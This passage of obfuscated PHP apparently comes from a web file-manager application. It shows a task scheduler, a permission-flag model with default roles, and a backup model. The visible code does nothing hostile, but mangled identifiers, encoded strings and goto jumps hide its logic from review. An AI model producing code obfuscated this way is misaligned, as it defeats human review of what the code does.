$GLOBALS[$ü”ŸÁñ‰[1752]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Í‹è≤ﬁé =& $_SERVER[ˆë€Ï⁄∂]; http_close(); self::valueSet($Í‹è≤ﬁé[841], $Í‹è≤ﬁé[240]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Í‹è≤ﬁé[1736] => $Í‹è≤ﬁé[240], $Í‹è≤ﬁé[841] => $Í‹è≤ﬁé[101])); self::log($Í‹è≤ﬁé[1753]); } public static function taskSwitch() { $ÉªóÄùƒ =& $_SERVER[ˆë€Ï⁄∂]; $ïî≠ÎΩ§ = self::valueGet($ÉªóÄùƒ[841]) == $ÉªóÄùƒ[101] ? $ÉªóÄùƒ[240] : $ÉªóÄùƒ[101]; self::valueSet($ÉªóÄùƒ[841], $ïî≠ÎΩ§); } public static function shutdownEvent() { $Åèˆï˚´ =& $_SERVER[ˆë€Ï⁄∂]; self::valueSet($Åèˆï˚´[1736], $Åèˆï˚´[240]); self::log($Åèˆï˚´[1754]); } public static function config($˛…„ƒ˝È, $é¨Ñ‡Õø) { self::valueSet($_SERVER[ˆë€Ï⁄∂][841], $˛…„ƒ˝È); } private static function taskRunAll() { $˜œú∏åã =& $_SERVER[ˆë€Ï⁄∂]; $¥ÜÃÑ¯‚ = timeFloat(); $Ôïö”ë˙ = Model($˜œú∏åã[1755])->listData(); $œ∞Ü’‚Ù = count($Ôïö”ë˙); for ($’ãÂú£ó = 0; $’ãÂú£ó < $œ∞Ü’‚Ù; $’ãÂú£ó++) { $¥âì˙ß˜ = $Ôïö”ë˙[$’ãÂú£ó]; if (!$¥âì˙ß˜[$˜œú∏åã[486]] || $¥âì˙ß˜[$˜œú∏åã[1756]] != $˜œú∏åã[101]) { continue; } if (!self::taskTimeCheck($¥âì˙ß˜)) { continue; } self::taskRun($¥âì˙ß˜); } Hook::trigger($˜œú∏åã[1757]); self::taskQueueRun($¥ÜÃÑ¯‚); } private static function taskQueueRun($˛Ö—ˆèÆ) { $Ç¬ÖΩœÆ = 10; while (!0) { $Û€º®¢Ò = TaskQueue::run(); if ($Û€º®¢Ò === !1) { break; } if (timeFloat() - $˛Ö—ˆèÆ >= $Ç¬ÖΩœÆ) { break; } } } private static function taskTimeCheck($Óòπ¬“Â) { $í«Ù˚é =& $_SERVER[ˆë€Ï⁄∂]; $¿∑¯≥Œ∏ = json_decode($Óòπ¬“Â[$í«Ù˚é[216]], !0); $≈îéÑËî = intval($Óòπ¬“Â[$í«Ù˚é[1737]]); $¶¨ç™Àì = strtotime($í«Ù˚é[1758] . $¿∑¯≥Œ∏[$í«Ù˚é[1759]] . $í«Ù˚é[1760]) - strtotime($í«Ù˚é[1761]); $‰˘Â∞•‡ = time() - strtotime(date($í«Ù˚é[1762]) . $í«Ù˚é[1763]); $»ñ∆éﬁŸ = $‰˘Â∞•‡ >= $¶¨ç™Àì && $‰˘Â∞•‡ <= $¶¨ç™Àì + 3600; switch ($¿∑¯≥Œ∏[$í«Ù˚é[33]]) { case $í«Ù˚é[1764]: if (time() - $≈îéÑËî < 3600 * 24 * 30) { return !1; } if ($¿∑¯≥Œ∏[$í«Ù˚é[1764]] == date($í«Ù˚é[1765]) && $»ñ∆éﬁŸ) { return !0; } break; case $í«Ù˚é[1766]: if (time() - $≈îéÑËî < 3600 * 24 * 7) { return !1; } $‹©ùí‘ú = date($í«Ù˚é[1767]) == 0 ? 7 : date($í«Ù˚é[1767]); if ($¿∑¯≥Œ∏[$í«Ù˚é[1766]] == $‹©ùí‘ú && $»ñ∆éﬁŸ) { return !0; } break; case $í«Ù˚é[1759]: if (time() - $≈îéÑËî < 3600 * 24) { return !1; } if ($»ñ∆éﬁŸ) { return !0; } break; case $í«Ù˚é[1768]: if (time() - $≈îéÑËî >= floatval($¿∑¯≥Œ∏[$í«Ù˚é[1768]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $å¢‘€Ñ¬ =& $_SERVER[ˆë€Ï⁄∂]; static $ÂºÔ†µ– = 0; $ººÂö‘˝ = 300; if (!$ÂºÔ†µ–) { $ÂºÔ†µ– = time(); } if (time() - $ÂºÔ†µ– < $ººÂö‘˝) { return; } $ÂºÔ†µ– = time(); $‡œê©¥§ = Model($å¢‘€Ñ¬[588])->db($å¢‘€Ñ¬[12]); if ($‡œê©¥§) { $‡œê©¥§->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($å¢‘€Ñ¬[1769], $å¢‘€Ñ¬[1770]); die; } } public static function taskRun($Ìﬁà⁄÷ñ) { $…Ë≥¸™ö =& $_SERVER[ˆë€Ï⁄∂]; self::log($…Ë≥¸™ö[1771] . $Ìﬁà⁄÷ñ[$…Ë≥¸™ö[486]] . $…Ë≥¸™ö[1772] . $Ìﬁà⁄÷ñ[$…Ë≥¸™ö[32]] . $…Ë≥¸™ö[1773] . $Ìﬁà⁄÷ñ[$…Ë≥¸™ö[1774]]); Model($…Ë≥¸™ö[1755])->run($Ìﬁà⁄÷ñ[$…Ë≥¸™ö[486]]); $ƒ˝˘Òπú = timeFloat(); $±Ô¡¸§Ó = $…Ë≥¸™ö[12]; switch ($Ìﬁà⁄÷ñ[$…Ë≥¸™ö[33]]) { case $…Ë≥¸™ö[393]: $ÿπ¬ë¶  = url_request($Ìﬁà⁄÷ñ[$…Ë≥¸™ö[1774]], $…Ë≥¸™ö[1511], !1, !1, !1, !1, 10); if ($ÿπ¬ë¶ [$…Ë≥¸™ö[841]]) { $±Ô¡¸§Ó = strlen($ÿπ¬ë¶ [$…Ë≥¸™ö[1302]]); } break; case $…Ë≥¸™ö[1775]: $±Ô¡¸§Ó = Hook::apply($Ìﬁà⁄÷ñ[$…Ë≥¸™ö[1774]]); default: break; } Model($…Ë≥¸™ö[1776])->add(array($…Ë≥¸™ö[1777] => $…Ë≥¸™ö[12], $…Ë≥¸™ö[1778] => $…Ë≥¸™ö[240], $…Ë≥¸™ö[33] => $…Ë≥¸™ö[1779] . $Ìﬁà⁄÷ñ[$…Ë≥¸™ö[486]], $…Ë≥¸™ö[1780] => json_encode(array($…Ë≥¸™ö[32] => $Ìﬁà⁄÷ñ[$…Ë≥¸™ö[32]], $…Ë≥¸™ö[1781] => timeFloat() - $ƒ˝˘Òπú, $…Ë≥¸™ö[379] => $±Ô¡¸§Ó)))); $ÃêºãæÏ = $±Ô¡¸§Ó ? $…Ë≥¸™ö[1782] . $±Ô¡¸§Ó : $…Ë≥¸™ö[12]; self::log($…Ë≥¸™ö[1783] . $Ìﬁà⁄÷ñ[$…Ë≥¸™ö[486]] . $…Ë≥¸™ö[188] . $ÃêºãæÏ); return !0; } public static function valueGet($Ü «Ô†∏) { $È¨‰ÏÉ =& $_SERVER[ˆë€Ï⁄∂]; $ùîíÁ¡… = $È¨‰ÏÉ[1784]; $ÖÀ◊¿Ì– = Model($È¨‰ÏÉ[519])->get($Ü «Ô†∏, $ùîíÁ¡…); if (is_null($ÖÀ◊¿Ì–)) { Model($È¨‰ÏÉ[519])->set($È¨‰ÏÉ[841], $È¨‰ÏÉ[101], $ùîíÁ¡…); Model($È¨‰ÏÉ[519])->set($È¨‰ÏÉ[1736], $È¨‰ÏÉ[240], $ùîíÁ¡…); $ÖÀ◊¿Ì– = Model($È¨‰ÏÉ[519])->get($Ü «Ô†∏, $ùîíÁ¡…); } return $ÖÀ◊¿Ì–; } private static function valueSet($Êò…€Ø˜, $÷ó‡ÊÒŸ = false) { $ﬁÒ•á∑û =& $_SERVER[ˆë€Ï⁄∂]; $—√û≈¨‚ = $ﬁÒ•á∑û[1785]; CacheLock::lock($—√û≈¨‚); $êÃóŒÑ¯ = Model($ﬁÒ•á∑û[519])->set($Êò…€Ø˜, $÷ó‡ÊÒŸ, $ﬁÒ•á∑û[1784]); CacheLock::unlock($—√û≈¨‚); return $êÃóŒÑ¯; } protected static function log($°ìôÇòë) { write_log($°ìôÇòë, $_SERVER[ˆë€Ï⁄∂][1770]); } private static function cacheClear() { $ê∫π∑å˙ =& $_SERVER[ˆë€Ï⁄∂]; Cache::clearMemory(Model($ê∫π∑å˙[519])->cacheKey($ê∫π∑å˙[1784])); Cache::clearMemory(Model($ê∫π∑å˙[519])->cacheKey($ê∫π∑å˙[1786])); Model($ê∫π∑å˙[1755])->cacheClear(); self::closeDatabase(); } } goto FÑ®∞Ã–åŒ; aŒæıë¢‹†: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $⁄™ÀÕ≤√ =& $_SERVER[ˆë€Ï⁄∂]; $…Ô‹∑É∂ = array(array($⁄™ÀÕ≤√[505] => LNG($⁄™ÀÕ≤√[1989]), $⁄™ÀÕ≤√[1990] => $⁄™ÀÕ≤√[1991], $⁄™ÀÕ≤√[1992] => 1, $⁄™ÀÕ≤√[1993] => 1, $⁄™ÀÕ≤√[1994] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($⁄™ÀÕ≤√[505] => LNG($⁄™ÀÕ≤√[1995]), $⁄™ÀÕ≤√[1990] => $⁄™ÀÕ≤√[1996], $⁄™ÀÕ≤√[1992] => 2, $⁄™ÀÕ≤√[1993] => 1, $⁄™ÀÕ≤√[1994] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($⁄™ÀÕ≤√[505] => LNG($⁄™ÀÕ≤√[1997]), $⁄™ÀÕ≤√[1990] => $⁄™ÀÕ≤√[1998], $⁄™ÀÕ≤√[1992] => 3, $⁄™ÀÕ≤√[1993] => 1, $⁄™ÀÕ≤√[1994] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($⁄™ÀÕ≤√[505] => LNG($⁄™ÀÕ≤√[1999]), $⁄™ÀÕ≤√[1990] => $⁄™ÀÕ≤√[2000], $⁄™ÀÕ≤√[1992] => 4, $⁄™ÀÕ≤√[1993] => 1, $⁄™ÀÕ≤√[1994] => self::AUTH_SHOW | self::AUTH_VIEW), array($⁄™ÀÕ≤√[505] => LNG($⁄™ÀÕ≤√[2001]), $⁄™ÀÕ≤√[1990] => $⁄™ÀÕ≤√[2002], $⁄™ÀÕ≤√[1992] => 5, $⁄™ÀÕ≤√[1993] => 1, $⁄™ÀÕ≤√[1994] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($⁄™ÀÕ≤√[505] => LNG($⁄™ÀÕ≤√[2003]), $⁄™ÀÕ≤√[1990] => $⁄™ÀÕ≤√[2004], $⁄™ÀÕ≤√[1992] => 6, $⁄™ÀÕ≤√[1993] => 1, $⁄™ÀÕ≤√[1994] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($⁄™ÀÕ≤√[505] => LNG($⁄™ÀÕ≤√[2005]), $⁄™ÀÕ≤√[1990] => $⁄™ÀÕ≤√[2006], $⁄™ÀÕ≤√[1992] => 7, $⁄™ÀÕ≤√[1993] => 1, $⁄™ÀÕ≤√[1994] => 0)); return $…Ô‹∑É∂; } public static function authCheck($ﬁ‹∑»˙Ú, $”‚∂≤°Õ) { $≠ƒÃàÁÄ =& $_SERVER[ˆë€Ï⁄∂]; $ﬁ‹∑»˙Ú = intval($ﬁ‹∑»˙Ú); if (KodUser::isRoot() && $GLOBALS[$≠ƒÃàÁÄ[6]][$≠ƒÃàÁÄ[2007]]) { return !0; } if ($ﬁ‹∑»˙Ú <= 0) { return !1; } if (($ﬁ‹∑»˙Ú & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ﬁ‹∑»˙Ú & $”‚∂≤°Õ); } public static function authCheckShow($Ìëœ¡ÙÌ) { return self::authCheck($Ìëœ¡ÙÌ, self::AUTH_SHOW); } public static function authCheckView($èÇ”˙œŒ) { return self::authCheck($èÇ”˙œŒ, self::AUTH_VIEW); } public static function authCheckDownload($©ŸÚ¶‰›) { return self::authCheck($©ŸÚ¶‰›, self::AUTH_DOWNLOAD); } public static function authCheckUpload($òÑﬁ”å°) { return self::authCheck($òÑﬁ”å°, self::AUTH_UPLOAD); } public static function authCheckEdit($∏áˆØ—æ) { return self::authCheck($∏áˆØ—æ, self::AUTH_EDIT); } public static function authCheckRemove($çç€¨’‹) { return self::authCheck($çç€¨’‹, self::AUTH_REMOVE); } public static function authCheckShare($‘›ﬂ–Î¡) { return self::authCheck($‘›ﬂ–Î¡, self::AUTH_SHARE); } public static function authCheckComment($˚‚áßìº) { return self::authCheck($˚‚áßìº, self::AUTH_COMMENT); } public static function authCheckEvent($‰ÛÜÄ¬) { return self::authCheck($‰ÛÜÄ¬, self::AUTH_EVENT); } public static function authCheckRoot($ä†ÃÖŸ«) { return self::authCheck($ä†ÃÖŸ«, self::AUTH_ROOT); } public static function authCheckAction($‹·÷µƒÅ, $ôª⁄°ô˚) { $Áí˜∂†î =& $_SERVER[ˆë€Ï⁄∂]; $–≥£⁄ª¶ = array($Áí˜∂†î[2008] => self::AUTH_VIEW, $Áí˜∂†î[1294] => self::AUTH_DOWNLOAD, $Áí˜∂†î[120] => self::AUTH_UPLOAD, $Áí˜∂†î[1957] => self::AUTH_EDIT, $Áí˜∂†î[1956] => self::AUTH_REMOVE, $Áí˜∂†î[1967] => self::AUTH_SHARE, $Áí˜∂†î[440] => self::AUTH_COMMENT, $Áí˜∂†î[1774] => self::AUTH_EVENT, $Áí˜∂†î[2009] => self::AUTH_ROOT); if (!isset($–≥£⁄ª¶[$ôª⁄°ô˚])) { return; } $üùÁêêÃ = $–≥£⁄ª¶[$ôª⁄°ô˚]; $‹·÷µƒÅ = intval($‹·÷µƒÅ); if ($‹·÷µƒÅ <= 0) { return !1; } if (($‹·÷µƒÅ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($‹·÷µƒÅ & $üùÁêêÃ); } public static function authDisable($Ì≠ì„ﬁÄ, $•π‡ ï€) { if (intval($Ì≠ì„ﬁÄ) <= 0) { return 0; } return intval($Ì≠ì„ﬁÄ) & ~$•π‡ ï€; } public $optionType = "\123\x79\x73\164\x65\x6d\x2e\163\x6f\x75\x72\x63\x65\x41\x75\x74\150\x4c\x69\163\x74"; public $field = array("\x6e\141\155\145", "\141\x75\164\x68", "\154\141\142\145\x6c", "\x64\x69\x73\x70\154\141\x79", "\163\171\x73\x74\x65\155", "\163\157\x72\x74"); public function initData() { $ÚåΩÈó∂ = $this->authDefault(); foreach ($ÚåΩÈó∂ as $ÙûÚ£Øú) { $this->add($ÙûÚ£Øú); } } public function findAuth($¢ö∏°ª∏, $√Å∫”πÑ) { $Êã·ç°‚ =& $_SERVER[ˆë€Ï⁄∂]; $“ä˛ÑÙ = parent::listData(); foreach ($“ä˛ÑÙ as $âÁﬁß¯ì) { $Ï¥ˆ“ç§ = intval($âÁﬁß¯ì[$Êã·ç°‚[498]]); if ($Ï¥ˆ“ç§ <= 0 || $âÁﬁß¯ì[$Êã·ç°‚[2010]] == 0) { continue; } if (($Ï¥ˆ“ç§ & $¢ö∏°ª∏) != $¢ö∏°ª∏) { continue; } if (($Ï¥ˆ“ç§ & $√Å∫”πÑ) != 0) { continue; } return $âÁﬁß¯ì[$Êã·ç°‚[486]]; } return !1; } public function findAuthMax($™é≤¿±Ã, $ƒë´åÅ¯) { $Ô¨ˆ«—Ñ =& $_SERVER[ˆë€Ï⁄∂]; $ê˘Ã…æ≤ = !1; $†®ãŒ‘¨ = parent::listData(); foreach ($†®ãŒ‘¨ as $áÂÔ≈´Æ) { $È®ƒÔâ– = intval($áÂÔ≈´Æ[$Ô¨ˆ«—Ñ[498]]); if ($È®ƒÔâ– <= 0 || $áÂÔ≈´Æ[$Ô¨ˆ«—Ñ[2010]] == 0) { continue; } if (($È®ƒÔâ– & $™é≤¿±Ã) != $™é≤¿±Ã) { continue; } if (($È®ƒÔâ– & $ƒë´åÅ¯) != 0) { continue; } if (!$ê˘Ã…æ≤) { $ê˘Ã…æ≤ = $áÂÔ≈´Æ; continue; } if (intval($ê˘Ã…æ≤[$Ô¨ˆ«—Ñ[498]]) < $È®ƒÔâ–) { $ê˘Ã…æ≤ = $áÂÔ≈´Æ; } } return $ê˘Ã…æ≤ ? $ê˘Ã…æ≤[$Ô¨ˆ«—Ñ[486]] : !1; } public function findAuthReadOnly() { $˙˘∏ÃªÁ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $≤º˙…¸¨ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($˙˘∏ÃªÁ, $≤º˙…¸¨); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Üæı‘≠ß =& $_SERVER[ˆë€Ï⁄∂]; $øÄ˛Ü¯õ = parent::listData(); $µºÑ«·´ = !1; foreach ($øÄ˛Ü¯õ as $àÓªÀÕÆ) { if ($àÓªÀÕÆ[$Üæı‘≠ß[498]] <= 0 || $àÓªÀÕÆ[$Üæı‘≠ß[2010]] == $Üæı‘≠ß[240]) { continue; } if (!$µºÑ«·´) { $µºÑ«·´ = $àÓªÀÕÆ; continue; } if ($µºÑ«·´[$Üæı‘≠ß[498]] > $àÓªÀÕÆ[$Üæı‘≠ß[498]]) { $µºÑ«·´ = $àÓªÀÕÆ; } } return $µºÑ«·´ ? $µºÑ«·´[$Üæı‘≠ß[486]] : $Üæı‘≠ß[12]; } public function listData($™Õò¿£ä = false, $∞éÏﬂäÒ = "\163\157\162\164", $â’ã¨Éì = false) { return parent::listData($™Õò¿£ä, $∞éÏﬂäÒ, $â’ã¨Éì); } public function update($Áê®ñÎæ, $ÒﬁÑ˘Ãì) { $ü·§‚…– =& $_SERVER[ˆë€Ï⁄∂]; $çÖ‰ªı— = parent::listData($Áê®ñÎæ); $õËΩ◊îﬁ = $this->findByName($ÒﬁÑ˘Ãì[$ü·§‚…–[32]]); if (!$çÖ‰ªı— || $õËΩ◊îﬁ && $õËΩ◊îﬁ[$ü·§‚…–[486]] != $çÖ‰ªı—[$ü·§‚…–[486]]) { return !1; } $this->filterAuth($ÒﬁÑ˘Ãì[$ü·§‚…–[498]]); return parent::update($Áê®ñÎæ, $ÒﬁÑ˘Ãì); } public function remove($ÍËîãÓÕ) { $Ñ≠Æﬂ’Ç = parent::listData($ÍËîãÓÕ); if (!$Ñ≠Æﬂ’Ç || $Ñ≠Æﬂ’Ç[$_SERVER[ˆë€Ï⁄∂][201]]) { return !1; } return parent::remove($ÍËîãÓÕ); } public function add($ö„˝⁄˙ê = array()) { $Ü¬äùÕ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->findByName($ö„˝⁄˙ê[$Ü¬äùÕ[32]])) { return !1; } $“âà‡˝Á = array($Ü¬äùÕ[32] => $Ü¬äùÕ[12], $Ü¬äùÕ[498] => 1, $Ü¬äùÕ[2011] => $Ü¬äùÕ[1998], $Ü¬äùÕ[2010] => 1, $Ü¬äùÕ[201] => 0, $Ü¬äùÕ[2012] => 0); $ö„˝⁄˙ê = array_merge($“âà‡˝Á, $ö„˝⁄˙ê); $ö„˝⁄˙ê[$Ü¬äùÕ[2012]] = $this->getSort(); $this->filterAuth($ö„˝⁄˙ê[$Ü¬äùÕ[498]]); return parent::insert($ö„˝⁄˙ê); } private function getSort() { $ÎÜ◊ª≤£ =& $_SERVER[ˆë€Ï⁄∂]; $Âë—ÖÖ∫ = parent::listData(); $©æ¡∆Ë¬ = array_to_keyvalue($Âë—ÖÖ∫, $ÎÜ◊ª≤£[12], $ÎÜ◊ª≤£[2012]); return empty($©æ¡∆Ë¬) ? 0 : max($©æ¡∆Ë¬) + 1; } private function filterAuth(&$ôÇ‡‘Òœ) { if (!$ôÇ‡‘Òœ) { return; } $‹é¶ÿ˘Œ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ù∏ìÊŒ¿ = array(); foreach ($‹é¶ÿ˘Œ as $â÷•Ïåï) { if ($ôÇ‡‘Òœ & $â÷•Ïåï) { $Ù∏ìÊŒ¿[] = $â÷•Ïåï; } } if (in_array(self::AUTH_ROOT, $Ù∏ìÊŒ¿)) { $ôÇ‡‘Òœ = array_sum($‹é¶ÿ˘Œ); return; } $÷Œáá∫Â = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ù∏ìÊŒ¿ as $â÷•Ïåï) { if (isset($÷Œáá∫Â[$â÷•Ïåï])) { $Ù∏ìÊŒ¿ = array_merge($Ù∏ìÊŒ¿, $÷Œáá∫Â[$â÷•Ïåï]); } } $Ù∏ìÊŒ¿[] = self::AUTH_SHOW; $ôÇ‡‘Òœ = array_sum(array_unique($Ù∏ìÊŒ¿)); } public function sort($⁄∫Ú®›®, $êÜïåóï) { return parent::update($⁄∫Ú®›®, $êÜïåóï); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\142\x61\x63\x6b\165\x70\114\x69\163\x74"; public $field = array("\x69\157", "\156\141\x6d\145", "\x73\164\141\x74\x75\163", "\143\157\x6e\164\145\156\164", "\155\x61\156\x75\x61\154", "\x72\145\163\165\154\164", "\x74\151\155\x65\x46\162\x6f\x6d", "\164\151\155\x65\x54\x6f"); public function config() { $¥â°–Éÿ =& $_SERVER[ˆë€Ï⁄∂]; Action($¥â°–Éÿ[2013])->taskInit(); $—¶ ÙÌÍ = Model($¥â°–Éÿ[861])->get($¥â°–Éÿ[875]); $—¶ ÙÌÍ = json_decode($—¶ ÙÌÍ, !0); $—¶ ÙÌÍ = is_array($—¶ ÙÌÍ) ? $—¶ ÙÌÍ : array(); $this->parseContent($—¶ ÙÌÍ); unset($—¶ ÙÌÍ[$¥â°–Éÿ[1756]]); Model($¥â°–Éÿ[1755])->cacheClear(); $≥Úò¯ˆÔ = $¥â°–Éÿ[2014]; $•ßí¯£Ã = Model($¥â°–Éÿ[2015])->findByKey($¥â°–Éÿ[1774], $≥Úò¯ˆÔ); if (!$•ßí¯£Ã) { $•ßí¯£Ã = array(); } if (isset($•ßí¯£Ã[$¥â°–Éÿ[216]])) { $•ßí¯£Ã[$¥â°–Éÿ[216]] = json_decode($•ßí¯£Ã[$¥â°–Éÿ[216]], !0); } if (isset($—¶ ÙÌÍ[$¥â°–Éÿ[216]])) { $•ßí¯£Ã[$¥â°–Éÿ[216]][$¥â°–Éÿ[1759]] = $—¶ ÙÌÍ[$¥â°–Éÿ[216]]; unset($—¶ ÙÌÍ[$¥â°–Éÿ[216]]); } return array_merge($•ßí¯£Ã, $—¶ ÙÌÍ); } public function listData($Æåü˝ôº = false, $Ò›íÅ•Ü = "\x6d\x6f\x64\x69\146\x79\x54\x69\155\x65", $äΩ√˛¬ = false) { $É™Ê£û∫ = parent::listData($Æåü˝ôº, $Ò›íÅ•Ü, !0); if (!$É™Ê£û∫) { return $É™Ê£û∫; } if ($Æåü˝ôº) { $É™Ê£û∫ = array($É™Ê£û∫); } foreach ($É™Ê£û∫ as &$…Æ°âËÉ) { $this->parseContent($…Æ°âËÉ); } return $Æåü˝ôº ? $É™Ê£û∫[0] : $É™Ê£û∫; } public function parseContent(&$îœÁÕÑí) { $ƒìÑ‘ÙÏ =& $_SERVER[ˆë€Ï⁄∂]; $√¶ê„ïª = _get($îœÁÕÑí, $ƒìÑ‘ÙÏ[181], $ƒìÑ‘ÙÏ[101]); if (!in_array($√¶ê„ïª, array($ƒìÑ‘ÙÏ[867], $ƒìÑ‘ÙÏ[1224]))) { $îœÁÕÑí[$ƒìÑ‘ÙÏ[181]] = $√¶ê„ïª == $ƒìÑ‘ÙÏ[101] ? $ƒìÑ‘ÙÏ[1224] : $ƒìÑ‘ÙÏ[867]; } } public function lastItem() { $öΩ¬í˜◊ = $this->listData(); return !empty($öΩ¬í˜◊[0]) ? $öΩ¬í˜◊[0] : null; } public function kill($óïµ·£©) { $∞∫Û≠ÿç =& $_SERVER[ˆë€Ï⁄∂]; $ñ¿¡€ﬁâ = $this->listData($óïµ·£©); if (!$ñ¿¡€ﬁâ || empty($ñ¿¡€ﬁâ[$∞∫Û≠ÿç[32]])) { return !0; } Task::kill($∞∫Û≠ÿç[874]); Task::kill($∞∫Û≠ÿç[892]); Task::kill($∞∫Û≠ÿç[901]); $¥æ¨Ä˙‹ = $ñ¿¡€ﬁâ[$∞∫Û≠ÿç[32]]; $Öˆò±È = TEMP_FILES . $∞∫Û≠ÿç[870] . $¥æ¨Ä˙‹ . $∞∫Û≠ÿç[8]; IO::remove($Öˆò±È, !1); return $this->remove($óïµ·£©); } public function remove($∆ÅÀ£≈ò) { $å∞Æ‰Ëõ = $this->listData($∆ÅÀ£≈ò); if (!$å∞Æ‰Ëõ) { return !0; } return $this->backupRemove($å∞Æ‰Ëõ); } private function backupRemove($§ÿâ¶ÍÓ) { parent::remove($§ÿâ¶ÍÓ[$_SERVER[ˆë€Ï⁄∂][486]]); $ä”¸ßÌÏ = $this->backupPath($§ÿâ¶ÍÓ); IO::remove($ä”¸ßÌÏ, !1); return !0; } private function backupPath($Ï‚’≈◊Ï) { $ƒﬁ¡˙±± =& $_SERVER[ˆë€Ï⁄∂]; $§⁄îìÀÔ = $Ï‚’≈◊Ï[$ƒﬁ¡˙±±[32]]; $¶∑Ÿ»˝Â = Model($ƒﬁ¡˙±±[861])->get($ƒﬁ¡˙±±[862]); $íƒËÈ°é = substr(md5($ƒﬁ¡˙±±[863] . $¶∑Ÿ»˝Â . $§⁄îìÀÔ), 0, 8); return "\x7b\x69\157\x3a{$Ï‚’≈◊Ï[$ƒﬁ¡˙±±[843]]}\175\57\x64\x61\x74\141\x62\141\163\145\57\142\x61\x63\x6b\165\160\57" . $§⁄îìÀÔ . $ƒﬁ¡˙±±[11] . $íƒËÈ°é; } public function start() { $–∏Å ≥» =& $_SERVER[ˆë€Ï⁄∂]; if ($GLOBALS[$–∏Å ≥»[6]][$–∏Å ≥»[102]][$–∏Å ≥»[2016]] != $–∏Å ≥»[101]) { return !0; } $å ˘úæ’ = $this->config(); if (!$å ˘úæ’ || $å ˘úæ’[$–∏Å ≥»[1756]] != $–∏Å ≥»[101]) { return !1; } if ($å ˘úæ’[$–∏Å ≥»[181]] == $–∏Å ≥»[867]) { $˜ÓÉÆßÁ = Model($–∏Å ≥»[861])->get($–∏Å ≥»[1339]); if ($˜ÓÉÆßÁ == $–∏Å ≥»[1340]) { $å ˘úæ’[$–∏Å ≥»[181]] = $–∏Å ≥»[1224]; } } $Ü£‡¶€è = $this->process(); foreach ($Ü£‡¶€è as $Ïûœ√¿Ö) { if ($Ïûœ√¿Ö) { return Task::restart($Ïûœ√¿Ö[$–∏Å ≥»[486]]); } } $÷®»ƒòΩ = new Backup(); $´åãäâÃ = $÷®»ƒòΩ->db(); if ($´åãäâÃ) { $´åãäâÃ = $÷®»ƒòΩ->dbFile(); if ($´åãäâÃ && $å ˘úæ’[$–∏Å ≥»[181]] == $–∏Å ≥»[867]) { $´åãäâÃ = $÷®»ƒòΩ->file(); } } Backup::set(array($–∏Å ≥»[841] => 1, $–∏Å ≥»[852] => time())); return !0; } public function process() { $åå◊ºÀÉ =& $_SERVER[ˆë€Ï⁄∂]; $öö†„Ú© = array($åå◊ºÀÉ[848] => Task::get($åå◊ºÀÉ[874]), $åå◊ºÀÉ[853] => Task::get($åå◊ºÀÉ[892]), $åå◊ºÀÉ[242] => Task::get($åå◊ºÀÉ[901])); $≈∏π˙‡Ä = !1; foreach ($öö†„Ú© as &$¶ÿ±Ï¥†) { if ($≈∏π˙‡Ä) { $¶ÿ±Ï¥† = !1; continue; } if ($¶ÿ±Ï¥†) { $¿áÙ∏êÖ = intval(_get($¶ÿ±Ï¥†, $åå◊ºÀÉ[1792], 0)); if (time() - $¿áÙ∏êÖ > 7200) { Task::kill($¶ÿ±Ï¥†[$åå◊ºÀÉ[486]]); $≈∏π˙‡Ä = !0; $¶ÿ±Ï¥† = !1; } } } return $öö†„Ú©; } public function restore() { $¡áË√µ∂ =& $_SERVER[ˆë€Ï⁄∂]; ActionCall($¡áË√µ∂[1152], !0, 1); ActionCall($¡áË√µ∂[1152], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\x6d\x65" => "\x63\x6f\x6d\155\145\156\164\137\155\145\x74\x61", "\x6d\145\164\141\x46\151\x65\154\x64" => 